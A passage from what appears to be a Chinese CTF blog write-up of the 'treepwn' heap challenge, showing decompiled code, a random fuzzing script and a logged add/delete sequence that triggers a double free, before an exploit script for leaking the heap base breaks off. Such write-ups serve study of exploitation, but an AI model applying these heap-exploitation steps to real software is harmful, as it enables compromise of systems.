      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/07/26/fuzz%E5%9C%A8heap%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8+UAF/" class="post-title-link" itemprop="url">fuzz在heap中的利用+UAF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-07-26 16:54:58 / Modified: 16:56:20" itemprop="dateCreated datePublished" datetime="2022-07-26T16:54:58+08:00">2022-07-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>14k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>13 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>treepwn</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.27</span><span class="number">-3u</span>buntu1<span class="number">.6</span>)</span> stable release version 2.27</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  <span class="built_in">exp</span> patchelf ./treepwn --<span class="built_in">set</span>-interpreter ./ld<span class="number">-2.27</span>.so  --replace-needed libc.so<span class="number">.6</span> ./libc<span class="number">-2.27</span>.so --output treepwn1</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">treepwn: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=<span class="number">52</span>acebb4c604a32e672707ee52940d700c1eab8c, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<p>64位，dynamically，全开</p>
<p>IDA 逆向后，发现这是一个与 R 树有关的程序，代码量很大，打比赛时连漏洞都没有找到就g了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> input; <span class="comment">// [rsp+14h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  prepare();</span><br><span class="line">  tree_init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, menu);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">    <span class="keyword">switch</span> ( input )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        choice_insert_handler(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        choice_delete_handler(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        choice_edit_handler(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        choice_show_handler(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        choice_query_handler(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        tree_clear(<span class="string">&quot;%d&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;That&#x27;s not a valid action&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>今天无意间看见一个博客，他使用了 fuzz 的思想找到了漏洞</p>
<p>fuzz 脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fuzz</span>():</span></span><br><span class="line">    f=<span class="built_in">open</span>(<span class="string">&#x27;./log.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x1000</span>):</span><br><span class="line">        <span class="keyword">if</span>(i%<span class="number">10</span>==<span class="number">0</span>):</span><br><span class="line">            a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            add(a,b,<span class="built_in">str</span>(i))</span><br><span class="line">            data0=p.recvuntil(<span class="string">&#x27;Choice Table&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;two many&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            f.write(<span class="string">&#x27;add(&#123;&#125;,&#123;&#125;,str(&#123;&#125;))\n&#x27;</span>.<span class="built_in">format</span>(a,b,i))</span><br><span class="line">            success(<span class="string">&#x27;add(&#123;&#125;,&#123;&#125;,str(&#123;&#125;))\n&#x27;</span>.<span class="built_in">format</span>(a,b,i))</span><br><span class="line">        <span class="keyword">elif</span>(i%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">            a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            dele(a,b)</span><br><span class="line">            data0=p.recvline()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;not exists&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            f.write(<span class="string">&#x27;dele(&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b))</span><br><span class="line">            success(<span class="string">&#x27;dele(&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            a = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            b = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            c = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            d = randint(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">            query(a,b,c,d)</span><br><span class="line">            data0=p.recvuntil(<span class="string">&#x27;Choice Table&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;totally 0 elements&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;\x55&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">                f.write(<span class="string">&#x27;query(&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b,c,d))</span><br><span class="line">                success(<span class="string">&#x27;query(&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b,c,d))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&#x27;\x56&#x27;</span> <span class="keyword">in</span> data0:</span><br><span class="line">                f.write(<span class="string">&#x27;query(&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b,c,d))</span><br><span class="line">                success(<span class="string">&#x27;query(&#123;&#125;,&#123;&#125;,&#123;&#125;,&#123;&#125;)\n&#x27;</span>.<span class="built_in">format</span>(a,b,c,d))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>
<ul>
<li>随机执行 add，dele，query 模块，并记录到 log.txt 中</li>
<li>发现程序有报错：</li>
</ul>
<p><img src="/2022/07/26/fuzz%E5%9C%A8heap%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8+UAF/1658814901718.png" alt="1658814901718"> </p>
<ul>
<li>把 log.txt 中的记录重新写入程序，发现 Double free：</li>
</ul>
<p><img src="/2022/07/26/fuzz%E5%9C%A8heap%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8+UAF/1658815181437.png" alt="1658815181437"> </p>
<p>此时我们就可以分析造成 Double free 的恶意 payload（记录于 log.txt 中）来定位漏洞点</p>
<p>恶意 payload 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">10</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">20</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">30</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">40</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">50</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">60</span>))</span><br><span class="line">dele(<span class="number">7</span>,<span class="number">6</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">70</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">80</span>)) <span class="comment"># target</span></span><br><span class="line">add(<span class="number">8</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">90</span>))</span><br><span class="line">dele(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">100</span>))</span><br><span class="line">dele(<span class="number">1</span>,<span class="number">5</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">110</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">120</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">130</span>))</span><br><span class="line">dele(<span class="number">3</span>,<span class="number">5</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">140</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">150</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">160</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">170</span>))</span><br><span class="line">dele(<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">180</span>))</span><br><span class="line">dele(<span class="number">6</span>,<span class="number">6</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">190</span>))</span><br><span class="line">dele(<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">200</span>))</span><br><span class="line">dele(<span class="number">0</span>,<span class="number">8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">210</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">220</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">230</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">240</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">250</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">260</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">270</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">280</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">290</span>))</span><br><span class="line">dele(<span class="number">1</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">300</span>))</span><br><span class="line">dele(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">310</span>))</span><br><span class="line">dele(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">320</span>))</span><br><span class="line">dele(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">330</span>))</span><br><span class="line">dele(<span class="number">7</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">340</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">350</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">360</span>))</span><br><span class="line">dele(<span class="number">0</span>,<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">370</span>))</span><br><span class="line">dele(<span class="number">6</span>,<span class="number">8</span>) <span class="comment"># target</span></span><br><span class="line">add(<span class="number">7</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">380</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">390</span>))</span><br><span class="line">dele(<span class="number">4</span>,<span class="number">4</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">400</span>))</span><br><span class="line">dele(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">410</span>))</span><br><span class="line">dele(<span class="number">7</span>,<span class="number">8</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">420</span>))</span><br><span class="line">add(<span class="number">1</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">430</span>))</span><br><span class="line">dele(<span class="number">3</span>,<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">7</span>,<span class="number">6</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">440</span>))</span><br><span class="line">add(<span class="number">0</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">450</span>))</span><br><span class="line">dele(<span class="number">1</span>,<span class="number">6</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">460</span>))</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0</span>,<span class="built_in">str</span>(<span class="number">470</span>))</span><br><span class="line">dele(<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">480</span>))</span><br><span class="line">dele(<span class="number">7</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">490</span>))</span><br><span class="line">add(<span class="number">5</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">500</span>))</span><br><span class="line">dele(<span class="number">5</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">510</span>))</span><br><span class="line">dele(<span class="number">3</span>,<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">0</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">520</span>))</span><br><span class="line">add(<span class="number">4</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">530</span>))</span><br><span class="line">dele(<span class="number">5</span>,<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">6</span>,<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">4</span>,<span class="built_in">str</span>(<span class="number">540</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">550</span>))</span><br><span class="line">add(<span class="number">8</span>,<span class="number">7</span>,<span class="built_in">str</span>(<span class="number">560</span>))</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">570</span>))</span><br><span class="line">dele(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">8</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">580</span>))</span><br><span class="line">add(<span class="number">3</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">590</span>))</span><br><span class="line">dele(<span class="number">8</span>,<span class="number">7</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">600</span>))</span><br><span class="line">dele(<span class="number">4</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">610</span>))</span><br><span class="line">dele(<span class="number">1</span>,<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">6</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">620</span>))</span><br><span class="line">dele(<span class="number">5</span>,<span class="number">1</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">1</span>,<span class="built_in">str</span>(<span class="number">630</span>))</span><br><span class="line">dele(<span class="number">6</span>,<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">640</span>))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">8</span>,<span class="built_in">str</span>(<span class="number">650</span>)) <span class="comment"># target</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">6</span>,<span class="built_in">str</span>(<span class="number">660</span>))</span><br><span class="line">dele(<span class="number">6</span>,<span class="number">8</span>) <span class="comment"># target</span></span><br><span class="line">dele(<span class="number">8</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">670</span>))</span><br><span class="line">dele(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">3</span>,<span class="built_in">str</span>(<span class="number">680</span>))</span><br><span class="line">dele(<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">3</span>,<span class="number">6</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">5</span>,<span class="built_in">str</span>(<span class="number">690</span>))</span><br><span class="line">dele(<span class="number">4</span>,<span class="number">8</span>)</span><br><span class="line">dele(<span class="number">4</span>,<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">2</span>,<span class="built_in">str</span>(<span class="number">700</span>))</span><br><span class="line">dele(<span class="number">6</span>,<span class="number">8</span>) <span class="comment"># target</span></span><br></pre></td></tr></table></figure>
<ul>
<li>最后两个 <code>dele(6,8)</code> 触发了 Double free</li>
<li>正常的 free 是有防止 UAF 的，但是在 tree_split_leaf_node 函数里面就没有</li>
<li>至于为什么会进入 tree_split_leaf_node 这一点我还不清楚，但只要知道这个 payload 可以触发 Double free 就好了</li>
</ul>
<p>打上断点进行调试，然后顺利 leak heap_base：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span 